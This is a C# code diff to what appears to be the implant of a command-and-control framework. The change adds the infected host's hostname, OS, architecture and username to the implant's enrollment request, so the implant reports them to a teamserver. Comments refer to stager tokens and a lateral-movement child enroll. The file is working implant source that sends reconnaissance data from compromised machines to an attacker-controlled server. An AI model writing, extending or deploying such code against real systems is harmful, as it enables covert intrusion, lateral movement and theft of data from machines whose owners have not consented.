@@ -29,7 +29,9 @@ internal enum EnrollStatus
 // SubjectPublicKeyInfo, base64 over JSON; the teamserver signs a leaf over it so
 // the implant keeps its private key (architecture.md Sec 9). ParentImplantId,
 // when set, names the implant this one derives from (architecture.md Sec 10.1):
-// a child enroll carried over from lateral.move.
+// a child enroll carried over from lateral.move. The host fields carry the
+// device identity the teamserver records for fleet grouping; all are omitted
+// when the runtime had nothing to report.
 internal sealed class EnrollRequest
 {
     [JsonPropertyName("stagerTokenSecret")]
@@ -46,6 +48,22 @@ internal sealed class EnrollRequest
     [JsonPropertyName("parentImplantId")]
     [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
     public string? ParentImplantId { get; set; }
+
+    [JsonPropertyName("hostname")]
+    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
+    public string? Hostname { get; set; }
+
+    [JsonPropertyName("os")]
+    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
+    public string? Os { get; set; }
+
+    [JsonPropertyName("arch")]
+    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
+    public string? Arch { get; set; }
+
+    [JsonPropertyName("username")]
+    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
+    public string? Username { get; set; }
 }
 
 // Mirrors the teamserver's EnrollmentResponse: the issued leaf and CA chain,
@@ -149,6 +167,11 @@ internal static class C2
     /// second argument); null lets the teamserver default it. Only a child
     /// enroll passes one.
     /// </param>
+    /// <param name="host">
+    /// The machine facts reported at enroll -- the device identity the
+    /// teamserver records for fleet grouping. Null omits them (tests and any
+    /// caller that has nothing to report).
+    /// </param>
     public static async Task<Enrollment> EnrollAsync(
         string enrollUrl,
         string stagerToken,
@@ -157,6 +180,7 @@ internal static class C2
         X509Certificate2Collection? serverCAs,
         TransportProfile profile,
         string? implantClass = null,
+        HostIdentity? host = null,
         CancellationToken cancellationToken = default)
     {
         // Export the public half as a DER SubjectPublicKeyInfo -- exactly what
@@ -168,6 +192,10 @@ internal static class C2
             Class = implantClass,
             PublicKey = Convert.ToBase64String(pubSpki),
             ParentImplantId = parentImplantId,
+            Hostname = host?.Hostname,
+            Os = host?.Os,
+            Arch = host?.Arch,
+            Username = host?.Username,
         };
 
         using var handler = new HttpClientHandler();
